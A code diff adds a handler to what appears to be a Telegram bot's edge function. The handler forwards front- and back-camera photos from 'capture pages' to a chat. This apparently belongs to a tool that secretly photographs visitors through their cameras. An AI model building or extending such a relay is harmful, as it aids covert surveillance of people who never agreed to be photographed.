@@ -708,6 +708,16 @@ serve(async (req) => {
       return new Response('OK', { headers: corsHeaders });
     }
 
+    // ===== Internal photo notification from capture pages =====
+    if (update._internal_photo_notify) {
+      const { chatId, photoUrl, cameraType, captureNum } = update;
+      if (chatId && photoUrl) {
+        const caption = `📷 <b>Camera Capture</b>\n\n📸 ${cameraType === 'front' ? 'Front' : 'Back'} Camera #${captureNum || 1}\n⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+        await sendPhoto(chatId, photoUrl, caption);
+      }
+      return new Response('OK', { headers: corsHeaders });
+    }
+
     const url = new URL(req.url);
     if (url.searchParams.get('action') === 'setwebhook') {
       const supabaseUrl = Deno.env.get('SUPABASE_URL') ?? '';
